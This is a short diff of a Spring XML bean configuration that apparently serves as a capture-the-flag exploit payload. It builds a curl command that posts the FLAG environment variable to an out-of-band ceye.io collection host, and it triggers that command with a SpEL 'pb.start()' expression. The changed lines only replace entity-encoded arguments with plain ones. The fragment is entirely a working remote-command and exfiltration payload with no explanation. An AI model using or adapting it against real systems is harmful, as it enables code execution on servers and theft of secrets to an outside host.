@@ -9,8 +9,8 @@
         <list>
             <value>curl</value>
             <value>jackson.zg80gf.ceye.io</value>
-            <value>&#45;d</value>
-          <value>&#34;flag=&#36;FLAG&#34;</value>
+          <value>-d</value>
+          <value>flag=$FLAG</value>
         </list>
     </constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
